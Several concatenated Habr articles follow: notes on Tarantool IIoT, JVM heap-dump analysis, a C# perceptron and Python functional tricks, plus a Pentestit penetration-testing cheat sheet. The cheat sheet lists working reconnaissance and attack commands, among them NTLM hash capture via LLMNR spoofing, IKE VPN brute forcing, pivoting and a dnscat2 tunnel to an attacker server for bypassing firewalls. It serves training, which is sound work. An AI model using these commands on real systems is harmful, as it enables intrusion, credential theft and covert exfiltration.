СУБД и сервер приложений объединены (а в Tarantool они объединены и работают в одном процессе), накладных расходов на их общение друг с другом, очевидно, будет сильно меньше (вот тут о накладных расходах, которые огромны даже при взаимодействии с быстрыми СУБД: Asynchronous processing with in-memory databases or how to handle one million transactions per second on a single CPU core). При этом любые накладные расходы на передачу информации между разными процессами получаются очень большими в свете невысокой производительности устройств и огромного количества информации, которую нужно обрабатывать. Еще есть такая неплохая штука — SQLite, он хороший и быстрый, но, к сожалению, у него нет репликации и сервера приложений из коробки — т. е. поверх него надо еще поплясать с бубном. Остальные традиционные СУБД (не буду называть, тут большой список уважаемых продуктов, все их прекрасно знают) у нас просто не завелись нормально на маленьких железочках IoT или даже близко не справились с той нагрузкой, которая идет от датчиков. Однако если у вас есть положительный опыт применения других СУБД на IoT-девайсах, то мы будем рады, если вы поделитесь им! Это все, что я хотел рассказать о Tarantool IIoT. У нас уже в процессе пилоты с различными производственными, транспортными и другими компаниями. Как только будет продакшн, мы обязательно про это детально напишем. Следите за новостями!"], "hab": ["Разработка для интернета вещей", "Анализ и проектирование систем", "Open source", "NoSQL", "Блог компании Mail.Ru Group"]}{"url": "https://habrahabr.ru/company/pentestit/blog/322834/", "title": ["«Zero Security: A» — начальный уровень подготовки в области практической информационной безопасности"], "text": ["Одним из основных направлений деятельности Pentestit является разработка специализированных программ начальной (Zero Security: A) и профессиональной (Корпоративные лаборатории) подготовки в области информационной безопасности. Вне зависимости от программ обучения, их ключевыми особенностями являются актуальный материал и практическая подготовка в пентест-лабораториях, составляющая 80% от общей программы курса. В данной статье мы разберем базис команд и полезных трюков при проведении тестирования на проникновение внешнего периметра. Многие новички при работе в специализированных дистрибутивах (Kali Linux, BlackArch, BackBox и др.) сталкиваются с незнанием основного синтаксиса команд и простейшего инструментария при проведении тестирования на проникновение. Действительно, сейчас довольно много утилит и техник их использования, что поневоле \"разбегаются глаза\", что, когда и в каком случае применять. Для этого мы подготовили краткий справочник по основным командам и утилитам. Справочник пентестера часть 1 Данный справочник представляет собой список команд, которые могут вам понадобиться при проведении тестирования на проникновение. Данный справочник разработан таким образом, что не предоставляет развернутого описания команд, а лишь приводит рабочие примеры. Для более подробной информации о команде или утилите мы рекомендуем изучить ее man страницу или посетить официальный сайт. Данный справочник в большей степени затрагивает тестирование сети и инфраструктуры. Тестирование веб-приложений не рассматривается в данном справочнике, за исключением нескольких примеров с sqlmap в конце данного пособия. Конфигурация сети Назначение IP-адреса ifconfig eth0 xxx.xxx.xxx.xxx/24 Информация о подсети ipcalc xxx.xxx.xxx.xxx/24 ipcalc xxx.xxx.xxx.xxx 255.255.255.0 OSINT (сбор информации) WHOIS: whois domain-name-here.com Выполнение DNS Lookup запросов: dig @nameserver domainname.com A Обнаружение MX записей: dig @nameserver domainname.com MX Выполнение запроса Zone Transfer используя DIG: dig @nameserver domainname.com AXFR DNS Трансфер зоны Windows DNS трансфер зоны nslookup -> set type=any -> ls -d blah.com Linux DNS трансфер зоны dig @ns1.blah.com blah.com axfr Email Используйте Simply Email для сбора почтовых адресов указанного домена из открытых источников (github, target site и т.п.). Утилита работает продуктивнее, если вы используете прокси и большие значения задержек, так, что google не будет считать активность подозрительной и выдавать капчу. git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -all -e TARGET-DOMAIN Simply Email может проверять обнаруженные email адреса после сбора. Ручной finger printing / banner grabbing Получение информации о SMTP сервисе через баннер nc -v 192.168.1.1 25 telnet 192.168.1.1 25 Получение баннера при помощи NC nc TARGET-IP 80 GET / HTTP/1.1 Host: TARGET-IP User-Agent: Mozilla/5.0 Referrer: meh-domain <enter> DNS Брутфорс DNSRecon dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml output.xml Сканирование портов Nmap сканирование с подробным выводом, метод syn, T4 скорость (подходит для LAN), получение информации о версии ОС и сервисов, traceroute и NSE скрипты в отношении найденных сервисов nmap -v -sS -A -T4 target То же, что и выше, сканирование всех TCP, даже если хост не отвечает на ICMP запросы (занимает больше времени) nmap -v -sS -p- -A -T4 -Pn target То же, что выше, + сканирование UDP диапазона (требует очень много времени) nmap -v -sU -sS -p- -A -T4 target Nmap скрипт для обнаружения уязвимых SMB серверов (ВНИМАНИЕ: unsafe=1 может вызвать ошибку на сервере) nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X Поиск NSE скриптов по регулярным выражениям ls /usr/share/nmap/scripts/* | grep ftp Nmap UDP cканирование nmap -sU target UDP Protocol Scanner git clone https://github.com/portcullislabs/udp-proto-scanner.git Команда для сканирования IP-адресов из файла по всем сервисам: ./udp-proto-scanner.pl -f ip.txt Сканирование определенного UDP сервиса: udp-proto-scanner.pl -p ntp -f ips.txt Другие методы для этапа host discovery, без использования nmap Проверяет, доступен ли хост, путем отправки ARP запроса: arping 192.168.1.1 -c 1 Обнаруживает IP, MAC адреса в подсети через ARP (может быть полезно для проверки VLAN): netdiscover -r 192.168.1.0/24 Обнаружение и эксплуатация сетевых сервисов Обнаружение SMB: smblookup -A target smbclient //MOUNT/share -I target -N rpcclient -U \"\" target enum4linux target Обнаруживает Windows/Samba серверы в подсети, определяет Windows MAC адреса, netbios имя и рабочую группу/домен nbtscan 192.168.1.0/24 Определение версии SMB: smbclient -L //192.168.1.100 Поиск SMB ресурсов: nmap -T4 -v -oA shares --script=smb-enum-shares --script-args=smbuser=username,smbpass=password -p445 192.168.1.0/24 Обнаружение SMB пользователей: nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX Атака RID Cycling: ridenum.py 192.168.XXX.XXX 500 50000 dict.txt Модуль Metasploit для атаки RID cycling: use auxiliary/scanner/smb/smb_lookupsid Null session тестирование в ручном режиме Windows: net use \\\\TARGET\\IPC$ \"\" /u:\"\" Linux: smbclient -L //192.168.99.131 NBTScan unixwiz apt-get install nbtscan-unixwiz nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan LLMNR / NBT-NS Spoofing Metasploit LLMNR / NetBIOS запросы: Подмена/модификация LLMNR / NetBIOS запросов: auxiliary/spoof/llmnr/llmnr_response auxiliary/spoof/nbns/nbns_response Перехват NTLM хэшей: auxiliary/server/capture/smb auxiliary/server/capture/http_ntlm Для взлома хэша NTLMv2 используйте john или hashcat. Как альтернативу можно использовать responder.py. git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0 SNMP Исправление SNMP значений в выводе для удобного восприятия: apt-get install snmp-mibs-downloader download-mibs echo \"\" > /etc/snmp/snmp.conf Обнаружение SNMP snmpcheck -t 192.168.1.X -c public snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName|cut -d* * -f snmpenum -t 192.168.1.X onesixtyone -c names -i hosts Определение SNMPv3 серверов с nmap: nmap -sV -p 161 --script=snmp-info target-subnet Скрипт от Rory McCune’s помогает автоматизировать процесс поиска пользователей для SNMPv3: https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb Словари Metasploit содержат стандартные учетные данные для SNMP v1 и v2: /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt Тестирование TLS & SSL Тестирует всё на выбранном хосте и выводит в файл: ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html Сеть Перенаправление удаленного порта на локальный: plink.exe -P 22 -l root -pw \"1337\" -R 445:127.0.0.1:445 REMOTE-IP SSH Pivoting ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip SSH pivoting из одной подсети в другую: ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1 (добавьте socks4 127.0.0.1 1010 в /etc/proxychains.conf) proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2 (добавьте socks4 127.0.0.1 1011 в /etc/proxychains.conf) Meterpreter Pivoting portfwd add –l 3389 –p 3389 –r target portfwd delete –l 3389 –p 3389 –r target VLAN Hopping Использование NCCGroups VLAN скприпт для Yersina упрощает процесс. git clone https://github.com/nccgroup/vlan-hopping.git chmod 700 frogger.sh ./frogger.sh Обнаружение VPN серверов ./udp-protocol-scanner.pl -p ike TARGET(s) Сканирование диапозона VPN серверов: ./udp-protocol-scanner.pl -p ike -f ip.txt Использование IKEForce для обнаружения или словарной атаки на VPN серверы. pip install pyip git clone https://github.com/SpiderLabs/ikeforce.git Выполните обнаружение IKE VPN с помощью IKEForce: ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic Брутфорс IKE VPN с помощьюIKEForce: ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1 ike-scan ike-scan TARGET-IP ike-scan -A TARGET-IP ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key Туннелирование трафика через DNS для обхода firewall dnscat2 поддерживает “download” и “upload” команды для получения файлов (данные или программы) на и с целевой машины. Машина атакующего: apt-get update apt-get -y install ruby-dev git make g++ gem install bundler git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install Запуск dnscat2: ruby ./dnscat2.rb dnscat2> New session established: 1422 dnscat2> session -i 1422 Атакуемая машина: https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell/ dnscat --host <dnscat server_ip> В следующих статьях я дополню справочник командами и трюками эксплуатации уязвимостей, брутфорса сетевых сервисов, примерами командных оболочек и т.д. Заключение Чтобы успешно противостоять злоумышленникам, необходимо хорошо знать методику и инструменты работы, что крайне сложно, учитывая их стремительное развитие. Программа курса обновляется раз в 3 месяца (через 1 набор), что позволяет давать актуальные и востребованные знания и практические навыки в области информационной безопасности. Уникальность программы курса в подаче и закреплении материала — 20% теории и 80% практики. Постоянно обновляя методический материал и добавляя практические задания мы стараемся дать наиболее полный объем информации для того чтобы участники курса получили исчерпывающую информацию о современных угрозах и методах противодействия, открыли новые вектора развития в области практической информационной безопасности."], "hab": ["Информационная безопасность", "Блог компании Pentestit"]}{"url": "https://habrahabr.ru/company/dbtc/blog/322950/", "title": ["Итак, мы сделали дамп JVM на 150 Гб. Что дальше?"], "text": ["Возможность сделать снимок (или дамп) памяти виртуальной машины Java — это инструмент, ценность которого сложно переоценить. Файл дампа содержит копии всех Java объектов, находившихся в памяти в момент снимка. Формат файла хорошо известен, и существует множество инструментов, которые умеют с ним работать. В моей практике анализ дампов JVM не раз помогал найти причины сложных проблем. Однако дампы бывают разные. В этот раз передо мной — дамп размером 150 Гб. Моя задача — анализ проблемы, выявленной в процессе, который стал источником этого дампа. Приложение, в котором я ищу проблему — это гибрид СУБД и системы непрерывной обработки данных. Все данные хранятся в памяти в виде Java объектов, поэтому размер «кучи» может достигать внушительных размеров (личный рекорд — 400 Гб). Обычно для работы с небольшими дампами я использую JVisualVM. Но полагаю, что дамп такого размера не по зубам ни JVisualVM, ни Eclipse Memory Analyzer, ни другим профайлерам (хотя пробовать я не стал). Даже копирование файла такого объёма с сервера на локальный диск уже представляет проблему. При анализе дампов в JVisualVM я часто прибегал к возможности использовать JavaScript для программного анализа графа объектов. Графические инструменты хороши, но пролистывать миллионы объектов — не самое приятное занятие. Гораздо приятнее исследовать граф объектов при помощи кода, а не мыши. Дамп JVM — это всего лишь сериализованный граф объектов; моя задача — извлечь из этого графа конкретную информацию. Мне не очень нужен красивый пользовательский интерфейс: API для работы с графом объектов программным путём — вот инструмент, который на самом деле мне нужен. Как программно проанализировать дамп «кучи»? Я начал свое исследование с профайлера NetBeans. NetBeans основан на открытом коде и имеет визуальный анализатор дампа «кучи» (этот же код используется в JVisualVM). Код для работы с дампом JVM является отдельным модулем, а предоставляемый им API вполне подходит для написания собственных специализированных алгоритмов анализа. Однако у анализатора дампов NetBeans имеется принципиальное ограничение. Библиотека использует временный файл для построения вспомогательного индекса по дампу. Размер индексного файла, как правило, составляет около 25% от размера дампа. Но самое важное — для построения этого файла требуется время, и любой запрос по графу объектов возможен только после того, как индекс построен. Изучив код, отвечающий за работу с дампом, я решил, что смогу избавиться от необходимости во временном файле, используя более компактную структуру индекса, которую можно хранить в памяти. Мой форк библиотеки, основанной на коде NetBeans профайлера, доступен на GitHub. Некоторые функции API не работают с компактной реализацией индекса (например, обход обратных ссылок), однако для моих задач они не очень нужны. Еще одним важным изменением по сравнению с исходной библиотекой было добавление HeapPath нотации. HeapPath — это язык выражений для описания путей в графе объектов, он заимствует некоторые идеи у XPath. Он полезен как в качестве универсального языка предикатов в механизмах обхода графов, так и в качестве простого инструмента для извлечения данных из дампа объектов. HeapPath автоматически конвертирует строки, примитивы и некоторые другие простые типы из структур дампа JVM в обычные Java объекты. Эта библиотека оказалась очень полезной в нашей повседневной работе. Одним из способов ее применения стал инструмент, анализирующий использование памяти в нашем продукте (гибрид СУБД и системы непрерывной обработки данных), который в автоматическом режиме анализирует размер вспомогательных структур по всем узлам реляционных преобразований (число которых может измеряться сотнями). Конечно, для интерактивного «свободного поиска» API + Java является не лучшим инструментом. Однако он дает мне возможность делать свою работу, а размер дампа в 150 Гб не оставляет выбора. Несколько итераций с кодированием на Java и запусками скрипта, анализ результатов — и через пару часов я знаю, что именно сломалось в наших структурах данных. На этом работа с дампом закончена, теперь надо искать проблему в коде. Кстати: Один проход «кучи» в 150 Гб занимает около 5 минут. Реальный анализ, как правило, требует нескольких проходов, но даже с учётом этого время обработки является приемлемым. В заключении хочется привести примеры использования моей библиотеки для менее экзотического ПО. На GitHub есть примеры по анализу дампов JBoss сервера. Анализ распределения объектов в Web сессиях Реконструкция дерева JSF компонентов"], "hab": ["Java", "Блог компании Технологический Центр Дойче Банка"]}{"url": "https://habrahabr.ru/post/308448/", "title": ["Нейронные сети для любопытных программистов (с примером на c#)"], "text": ["Так как в заголовке был отмечен «для любопытных программистов», хочу сказать, что и моё любопытство привело к тому, что я, будучи разработчиком мобильных игр, написал такой пост. Я совершенно уверен, что найдутся программисты, которые когда-то думали об искусственных интеллектах и это очень хороший шанс для них. Прочитав множество статьей про нейронных сетях, я хотел бы отметить некоторые из них, которые мне реально помогли освоить тему: пример на java и полезные ссылки наглядная реализация с использованием ООП Поскольку теории очень много по этой теме хотелось бы приступить к реализации. Реализация using UnityEngine; using System.Collections; using System.Xml.Serialization; public class Neuron { [XmlAttribute(\"weight\")] public string data; [XmlIgnore] public int[,] weight; // веса нейронов [XmlIgnore] public int minimum = 50; // порог [XmlIgnore] public int row = 64,column = 64; /** * Конструктор нейрона, создает веси и устанавливает случайные значения */ public Neuron() { weight = new int[row,column]; randomizeWeights(); } /** * ответы нейронов, жесткая пороговая * @param input - входной вектор * @return ответ 0 или 1 */ public int transferHard(int[,] input) { int power = 0; for(int r = 0; r < row;r++) { for(int c = 0; c < column;c++) { power += weight[r,c]*input[r,c]; } } //Debug.Log(\"Power: \" + power); return power >= minimum ? 1 : 0; } /** * ответы нейронов с вероятностями * @param input - входной вектор * @return n вероятность */ public int transfer(int[,] input) { int power = 0; for(int r = 0; r < row;r++) for(int c = 0; c < column;c++) power += weight[r,c]*input[r,c]; //Debug.Log(\"Power: \" + power); return power; } /** * устанавливает начальные произвольные значения весам */ void randomizeWeights() { for(int r = 0; r < row;r++) for(int c = 0; c < column;c++) weight[r,c] = Random.Range(0,10); } /** * изменяет веса нейронов * @param input - входной вектор * @param d - разница между выходом нейрона и нужным выходом */ public void changeWeights(int[,] input,int d) { for(int r = 0; r < row;r++) for(int c = 0; c < column;c++) weight[r,c] += d*input[r,c]; } public void prepareForSerialization() { data = \"\"; for(int r = 0; r < row;r++) { for(int c = 0; c < column;c++) { data += weight[r,c] + \" \"; } data += \"\\n\"; } } public void onDeserialize() { weight = new int[row,column]; string[] rows = data.Split(new char[]{'\\n'}); for(int r = 0; r < row;r++) { string[] columns = rows[r].Split(new char[]{' '}); for(int c = 0; c < column;c++) { weight[r,c] = int.Parse(columns[c]); } } } } Класс нейронов который содержит weight — двоичный массив весов, minimum — порог функции. Функция transferHard возвращает ответ на входной вектор. Поскольку ответ функции жесткий, я использую его для обучения. На мой взгляд это более эффективно обучает нейроны. Я буду очень благодарен если будут отзывы по этому поводу. Функция transfer возвращает ответ на входной вектор но с вероятностью, сумма может быть ближе к нулю или отрицательной если нейрон обучен для другого символа. using UnityEngine; using System.Collections; using System.Xml.Serialization; using System.Xml; using System.IO; public class NeuralNetwork { [XmlArray(\"Neurons\")] public Neuron[] neurons; /** * Конструктор сети создает нейроны */ public NeuralNetwork() { neurons = new Neuron[10]; for(int i = 0;i<neurons.Length;i++) neurons[i] = new Neuron(); } /** * функция распознавания символа, используется для обучения * @param input - входной вектор * @return массив из нулей и единиц, ответы нейронов */ int[] handleHard(int[,] input) { int[] output = new int[neurons.Length]; for(int i = 0;i<output.Length;i++) output[i] = neurons[i].transferHard(input); return output; } /** * функция распознавания символа, используется для конечного ответа * @param input - входной вектор * @return массив из вероятностей, ответы нейронов */ int[] handle(int[,] input) { int[] output = new int[neurons.Length]; for(int i = 0;i<output.Length;i++) output[i] = neurons[i].transfer(input); return output; } /** * ответ сети * @param input - входной вектор * @return индекс нейронов предназначенный для конкретного символа */ public int getAnswer(int[,] input) { int[] output = handle(input); int maxIndex = 0; for(int i = 1; i < output.Length;i++) if(output[i] > output[maxIndex]) maxIndex = i; return maxIndex; } /** * функция обучения * @param input - входной вектор * @param correctAnswer - правильный ответ */ public void study(int[,] input,int correctAnswer) { int[] correctOutput = new int[neurons.Length]; correctOutput[correctAnswer] = 1; int[] output = handleHard(input); while(!compareArrays(correctOutput,output)) { for(int i = 0; i < neurons.Length;i++) { int dif = correctOutput[i]-output[i]; neurons[i].changeWeights(input,dif); } output = handleHard(input); } } /** * сравнение двух вектор * @param true - если массивы одинаковые, false - если нет */ bool compareArrays(int[] a,int[] b) { if(a.Length != b.Length) return false; for(int i = 0;i<a.Length;i++) if(a[i] != b[i]) return false; return true; } void prepareForSerialization() { foreach(Neuron n in neurons) n.prepareForSerialization(); } void onDeserialize() { foreach(Neuron n in neurons) n.onDeserialize(); } public void saveLocal() { prepareForSerialization(); XmlSerializer serializer = new XmlSerializer(this.GetType()); FileStream stream = new FileStream(Application.dataPath + \"/NeuralNetwork.txt\", FileMode.Create); XmlWriter writer = new XmlTextWriter(stream, new System.Text.ASCIIEncoding()); using(writer) { serializer.Serialize(writer, this); } } public static NeuralNetwork fromXml() { string xml = \"\"; FileStream fStream = new FileStream(Application.dataPath + \"/NeuralNetwork.txt\", FileMode.OpenOrCreate); if(fStream.Length > 0) { byte[] tempData = new byte[fStream.Length]; fStream.Read(tempData, 0, tempData.Length); xml = System.Text.Encoding.ASCII.GetString(tempData); } fStream.Close(); if(string.IsNullOrEmpty(xml)) return new NeuralNetwork(); NeuralNetwork data; XmlSerializer serializer = new XmlSerializer(typeof(NeuralNetwork)); using(TextReader reader = new StringReader(xml)) { data = serializer.Deserialize(reader) as NeuralNetwork; } data.onDeserialize(); return data; } } Класс NeuralNetwork содержит массив нейронов, каждый из них предназначен для конкретного символа. В конструкторе создается массив из десяти элементов, потому что пример сделан для распознавания цифр(0-9). Если вы хотите использовать сеть для распознавания букв то поменяйте размер массива соответствующим образом. Функция handleHard вызывается для обучение нейронов, возвращает массив из нулей и единиц. Функция getAnswer ответ сети для входного вектора, использует функцию handle для получения массива ответов, каждый элемент массива содержит ответ нейрона с вероятностью. Функция getAnswer выбирает индекс элемента который содержит наибольшую вероятность и возвращает эго как ответ. После изучения многочисленной литературы я узнал, что активатор можно реализовать с помощью Сигмоидальной передаточной функции, которая усиливает слабые сигналы и придерживает сильные, но не могу понять каким образом это будет отражаться на улучшение распознавания символов. Хотелось бы увидеть пример распознавания символов с помощью Радиально Базисной функции, так так почти везде говорится, что с помощью этого метода улучшается распознавание. Заключение В заключении хотелось сказать, что для лучшего понимания кодов нейронных сетей советую немного почитать литературы и попытаться самостоятельно решить задачи такого типа, начиная с примитивного однослойного перцептрона. Хотелось увидеть различные отзывы на тему и на пост."], "hab": ["Алгоритмы", "C#"]}{"url": "https://habrahabr.ru/post/193920/", "title": ["Ненормальное функциональное программирование на python"], "text": ["После просмотра курса Programming Languages и прочтения Functional JavaScript захотелось повторить все эти крутые штуки в python. Часть вещей получилось сделать красиво и легко, остальное вышло страшным и непригодным для использования. Статья включает в себя: немного непонятных слов; каррирование; pattern matching; рекурсия (включая хвостовую). Статья рассчитана на python 3.3+. Немного непонятных слов На python можно писать в функциональном стиле, ведь в нем есть анонимные функции: sum_x_y = lambda x, y: x + y print(sum_x_y(1, 2)) # 3 Функции высшего порядка (принимающие или возвращающие другие функции): def call_and_twice(fnc, x, y): return fnc(x, y) * 2 print(call_and_twice(sum_x_y, 3, 4)) # 14 Замыкания: def closure_sum(x): fnc = lambda y: x + y return fnc sum_with_3 = closure_sum(3) print(sum_with_3(12)) # 15 Tuple unpacking(почти pattern matching): a, b, c = [1, 2, 3] print(a, b, c) # 1 2 3 hd, *tl = range(5) print(hd, 'tl:', *tl) # 0 tl: 1 2 3 4 И крутые модули functools и itertools. Каррирование Преобразование функции от многих аргументов в функцию, берущую свои аргументы по одному. Рассмотрим самый простой случай, каррируем функцию sum_x_y: sum_x_y_carry = lambda x: lambda y: sum_x_y(x, y) print(sum_x_y_carry(5)(12)) # 17 Что-то совсем не круто, попробуем так: sum_with_12 = sum_x_y_carry(12) print(sum_with_12(1), sum_with_12(12)) # 13 24 sum_with_5 = sum_x_y_carry(5) print(sum_with_5(10), sum_with_5(17)) # 15 22 Уже интересней, теперь сделаем универсальную функцию для каррирования функций с двумя аргументами, ведь каждый раз писать lambda x: lambda y: zzzz совсем не круто: curry_2 = lambda fn: lambda x: lambda y: fn(x, y) И применим ее к используемой в реальных проектах функции map: curry_map_2 = curry_2(map) @curry_map_2 def twice_or_increase(n): if n % 2 == 0: n += 1 if n % 3: n *= 2 return n print(*twice_or_increase(range(10))) # 2 2 3 3 10 10 14 14 9 9 print(*twice_or_increase(range(30))) # 2 2 3 3 10 10 14 14 9 9 22 22 26 26 15 15 34 34 38... Да-да, я использовал каррированый map как декоратор и нивелировал этим отсутствие многострочных лямбд. Но не все функции принимают 2 аргумента, поэтому сделаем функцию curry_n, используя partial, замыкания и немножко рекурсии: from functools import partial def curry_n(fn, n): def aux(x, n=None, args=None): # вспомогательная функция args = args + [x] # добавим аргумент в список всех аргументов return partial(aux, n=n - 1, args=args) if n > 1 else fn(*args) # вернем функцию с одним аргументом, созданную из aux либо вызовем изначальную с полученными аргументами return partial(aux, n=n, args=[]) И в очередной раз применим к map, но уже с 3 аргументами: curry_3_map = curry_n(map, 3) И сделаем функцию для сложения элементов списка с элементами списка 1..10: sum_arrays = curry_3_map(lambda x, y: x + y) sum_with_range_10 = sum_arrays(range(10)) print(*sum_with_range_10(range(100, 0, -10))) # 100 91 82 73 64 55 46 37 28 19 print(*sum_with_range_10(range(10))) # 0 2 4 6 8 10 12 14 16 18 Так как curry_2 — это частный случай curry_n, то можно сделать: curry_2 = partial(curry_n, n=2) И для примера применим его к filter: curry_filter = curry_2(filter) only_odd = curry_filter(lambda n: n % 2) print(*only_odd(range(10))) # 1 3 5 7 9 print(*only_odd(range(-10, 0, 1))) # -9 -7 -5 -3 -1 Pattern matching Метод анализа списков или других структур данных на наличие в них заданных образцов. Pattern matching — это то, что больше всего мне понравилось в sml и хуже всего вышло в python. Придумаем себе цель — написать функцию, которая: если принимает список чисел, возвращает их произведение; если принимает список строк, возвращает одну большую объединенную строку. Создадим вспомогательный exception и функцию для его «бросания», которую будем использовать, когда сопоставление не проходит: class NotMatch(Exception): \"\"\"Not match\"\"\" def not_match(x): raise NotMatch(x) И функцию, которая делает проверку и возвращает объект, либо бросает exception: match = lambda check, obj: obj if check(obj) else not_match(obj) match_curry = curry_n(match, 2) Теперь мы можем создать проверку типа: instance_of = lambda type_: match_curry(lambda obj: isinstance(obj, type_)) Тогда для int: is_int = instance_of(int) print(is_int(2)) # 2 try: is_int('str') except NotMatch: print('not int') # not int Создадим проверку типа для списка, проверяя его каждый элемент: is_array_of = lambda matcher: match_curry(lambda obj: all(map(matcher, obj))) И тогда для int: is_array_of_int = is_array_of(is_int) print(is_array_of_int([1, 2, 3])) # 1 2 3 try: is_array_of_int('str') except NotMatch: print('not int') # not int И теперь аналогично для str: is_str = instance_of(str) is_array_of_str = is_array_of(is_str) Также добавим функцию, возвращающую свой аргумент, идемпотентную =) identity = lambda x: x print(identity(10)) # 10 print(identity(20)) # 20 И проверку на пустой список: is_blank = match_curry(lambda xs: len(xs) == 0) print(is_blank([])) # [] try: is_blank([1, 2, 3]) except NotMatch: print('not blank') # not blank Теперь создадим функцию для разделения списка на первый элемент и остаток с применением к ним «проверок»: def hd_tl(match_x, match_xs, arr): x, *xs = arr return match_x(x), match_xs(xs) hd_tl_partial = lambda match_x, match_xs: partial(hd_tl, match_x, match_xs) И рассмотрим самый простой пример с identity: hd_tl_identity = hd_tl_partial(identity, identity) print(hd_tl_identity(range(5))) # 0 [1, 2, 3, 4] А теперь с числами: hd_tl_ints = hd_tl_partial(is_int, is_array_of_int) print(hd_tl_ints(range(2, 6))) # 2 [3, 4, 5] try: hd_tl_ints(['str', 1, 2]) except NotMatch: print('not ints') # not ints А теперь саму функцию, которая будет перебирать все проверки. Она очень простая: def pattern_match(patterns, args): for pattern, fnc in patterns: try: return fnc(pattern(args)) except NotMatch: continue raise NotMatch(args) pattern_match_curry = curry_n(pattern_match, 2) Но зато она неудобна в использовании и требует целый мир скобок, например, нужная нам функция будет выглядеть так: sum_or_multiply = pattern_match_curry(( (hd_tl_partial(identity, is_blank), lambda arr: arr[0]), # x::[] -> x (hd_tl_ints, lambda arr: arr[0] * sum_or_multiply(arr[1])), # x::xs -> x * sum_or_multiply (xs) где type(x) == int (hd_tl_partial(is_str, is_array_of_str), lambda arr: arr[0] + sum_or_multiply(arr[1])), # x::xs -> x + sum_or_multiply (xs) где type(x) == str )) Теперь проверим ее в действии: print(sum_or_multiply(range(1, 10))) # 362880 print(sum_or_multiply(['a', 'b', 'c'])) # abc Ура! Оно работает =) Рекурсия Во всех классных языках программирования крутые ребята реализуют map через рекурсию, чем мы хуже? Тем более мы уже умеем pattern matching: r_map = lambda fn, arg: pattern_match(( (hd_tl_partial(identity, is_blank), lambda arr: [fn(arr[0])]), # x::[] -> fn(x) ( hd_tl_partial(identity, identity), lambda arr: [fn(arr[0])] + r_map(fn, arr[1]) # x::xs -> fn(x)::r_map(fn, xs) ), ), arg) print(r_map(lambda x: x**2, range(10))) # [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] Теперь каррируем: r_map_curry = curry_n(r_map, 2) twice = r_map_curry(lambda x: x * 2) print(twice(range(10))) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] try: print(twice(range(1000))) except RuntimeError as e: print(e) # maximum recursion depth exceeded in comparison Что-то пошло не так, попробуем хвостовую рекурсию. Для этого создадим «проверку» на None: is_none = match_curry(lambda obj: obj is None) И проверку пары: pair = lambda match_x, match_y: lambda arr: (match_x(arr[0]), match_y(arr[1])) А теперь и сам map: def r_map_tail(fn, arg): aux = lambda arg: pattern_match(( (pair(identity, is_none), lambda arr: aux([arr[0], []])), # если аккумулятор None, делаем его [] ( pair(hd_tl_partial(identity, is_blank), identity), lambda arr: arr[1] + [fn(arr[0][0])] # если (x::[], acc), то прибавляем к аккумулятору fn(x) и возвращаем его ), ( pair(hd_tl_partial(identity, identity), identity), lambda arr: aux([arr[0][1], arr[1] + [fn(arr[0][0])]]) # если (x::xs, acc), то делаем рекурсивный вызов с xs и аккумулятором + fn(x) ), ), arg) return aux([arg, None]) Теперь опробуем наше чудо: r_map_tail_curry = curry_n(r_map_tail, 2) twice_tail = r_map_tail_curry(lambda x: x * 2) print(twice_tail(range(10))) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] try: print(twice_tail(range(10000))) except RuntimeError as e: print(e) # maximum recursion depth exceeded Вот ведь незадача — python не оптимизирует хвостовую рекурсию. Но теперь на помощь нам придут костыли: def tail_fnc(fn): called = False calls = [] def run(): while len(calls): # вызываем функцию с аргументами из списка res = fn(*calls.pop()) return res def call(*args): nonlocal called calls.append(args) # добавляем аргументы в список if not called: # проверяем вызвалась ли функция, если нет - запускаем цикл called = True return run() return call Теперь реализуем с этим map: def r_map_really_tail(fn, arg): aux = tail_fnc(lambda arg: pattern_match(( # декорируем вспомогательную функцию (pair(identity, is_none), lambda arr: aux([arr[0], []])), # если аккумулятор None, делаем его [] ( pair(hd_tl_partial(identity, is_blank), identity), lambda arr: arr[1] + [fn(arr[0][0])] # если (x::[], acc), то прибавляем к аккумулятору fn(x) и возвращаем его ), ( pair(hd_tl_partial(identity, identity), identity), lambda arr: aux([arr[0][1], arr[1] + [fn(arr[0][0])]]) # если (x::xs, acc), то делаем рекурсивный вызов с xs и аккумулятором + fn(x) ), ), arg)) return aux([arg, None]) r_map_really_tail_curry = curry_n(r_map_really_tail, 2) twice_really_tail = r_map_really_tail_curry(lambda x: x * 2) print(twice_really_tail(range(1000))) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18... Теперь и это заработало =) Не все так страшно Если забыть про наш ужасный pattern matching, то рекурсивный map можно реализовать вполне аккуратно: def tail_r_map(fn, arr_): @tail_fnc def aux(arr, acc=None): x, *xs = arr if xs: return aux(xs, acc + [fn(x)]) else: return acc + [fn(x)] return aux(arr_, []) curry_tail_r_map = curry_2(tail_r_map) И сделаем на нем умножение всех нечетных чисел в списке на 2: @curry_tail_r_map def twice_if_odd(x): if x % 2 == 0: return x * 2 else: return x print(twice_if_odd(range(10000))) # [0, 1, 4, 3, 8, 5, 12, 7, 16, 9, 20, 11, 24, 13, 28, 15, 32, 17, 36, 19... Получилось вполне аккуратно, хоть медленно и ненужно. Как минимум из-за скорости. Сравним производительность разных вариантов map: from time import time checker = lambda x: x ** 2 